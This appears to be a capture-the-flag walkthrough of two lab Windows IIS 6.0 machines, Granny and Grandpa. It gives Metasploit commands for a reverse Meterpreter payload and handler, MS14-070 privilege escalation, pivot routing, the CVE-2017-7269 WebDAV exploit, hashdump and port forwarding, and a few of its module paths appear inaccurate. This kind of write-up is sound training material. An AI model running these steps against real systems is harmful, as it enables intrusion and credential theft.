
	  # Granny Exploitation Walkthrough

Most of the exploitation and pivoting process shown in the video is carried out using the Metasploit Framework, including payload generation, session management, privilege escalation, pivot configuration, and post-exploitation.

Below is a step-by-step description of how Metasploit Framework would be used:

## Phase 1: Initial Access to Granny (10.10.10.15)

Initial access is achieved by exploiting WebDAV (IIS 6.0) using a combination of PUT (to upload content) and MOVE (to rename to an executable .aspx file), which is handled outside Metasploit (using Burp Suite or HTTP commands). However, the payload and the handler to receive the connection are configured in Metasploit.

### Generation of the Payload (msfvenom)

The msfvenom tool is used to create an ASPX payload (since the server uses ASP.NET) with a reverse Meterpreter connection.

**Command:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx
```

### Handler Configuration (msfconsole)

msfconsole is started and a handler is configured to listen for the reverse connection.

**Commands:**
```bash
use exploit/multi/handler
set LHOST 10.10.14.4   # Often set twice due to a "weird bug"
set LPORT 1337
set PAYLOAD windows/meterpreter/reverse_tcp
run   # or exploit
```

## Phase 2: Privilege Escalation on Granny (Inside Meterpreter)

Once the session is established (initially as NT AUTHORITY\NETWORK SERVICE):

### Verification of UID and Migration (Optional)

`getuid` is used to verify privileges. If a bad token is encountered, list processes (PS) and migrate to a more stable process, such as an svchost process.

**Example command:**
```bash
migrate 1848
```

### Use of the Local Exploit Suggester

Metasploit can recommend local exploits based on the OS and installed patches.

**Commands:**
```bash
background   # to background the Meterpreter shell
use exploit/post/windows/gather/local_exploit_suggester
set session [ID]   # example: set session 1
run
```

### Execution of the Elevation Exploit

The MS14-070 exploit succeeded in obtaining NT AUTHORITY\SYSTEM.

**Commands:**
```bash
use exploit/windows/local/ms14_070_tcpip_ioctl
set session [ID]   # example: set session 3
run
```

## Phase 3: Pivoting and Exploitation of Grandpa (10.10.10.14)

To access Grandpa through Granny, Metasploit is used to configure internal routing and run the exploit directly from the console, leveraging the already-elevated session on Granny.

### SOCKS Proxy Configuration (Optional)

The SOCKS module is used to establish a local proxy for external tools (like nmap or curl via proxychains).

**Command:**
```bash
use auxiliary/server/socks4a
```

### Metasploit Routing Configuration

This is the pivot key within Metasploit: instruct Metasploit to route traffic to Grandpa through the Meterpreter session on Granny.

**Command (example):**
```bash
route add 10.10.10.14 255.255.255.255 [SESSION_ID]   # example: route add 10.10.10.14 3
```

### Enumeration through the Pivot (Optional)

A Metasploit port scanner can be used to confirm connectivity through the configured route.

**Commands:**
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.14
set ports 80
run
```

### Exploitation of Grandpa (CVE-2017-7269)

An exploit for the WebDAV buffer overflow in IIS 6.0 is used.

**Commands:**
```bash
search 7269
use exploit/windows/iis/ms17_017_iis6_webdav_scstoragepath
set RHOST 10.10.10.14
```

**Crucial callback configuration:**
```bash
set LHOST 10.10.10.15   # the IP of Granny
run
```

This tells Metasploit that Grandpa's shell should connect back to Granny's interface, and Metasploit handles session forwarding.

## Phase 4: Post-Exploitation (Grandpa)

Once a SYSTEM-privileged session on Grandpa is obtained:

### Hash Dumping

Use the Meterpreter command to obtain user hashes, including the Administrator's LM and NTLM hashes.

**Command:**
```bash
hashdump
```

### Port Forwarding

To access internal services on Grandpa that are not externally exposed (such as SMB on port 445), port forwarding is configured.

**Command example:**
```bash
portfwd add -L 445 -R 445 -r 10.10.10.14
```

This forwards the attacker's local port 445 to Grandpa's port 445 through the Meterpreter session.

**Full syntax note:** As attempted in the video, it failed due to Meterpreter hanging. The correct syntax requires specifying the local port, the remote port, and the remote host:
```bash
portfwd add -L [LOCAL_PORT] -R [REMOTE_PORT] -r [REMOTE_HOST]
```
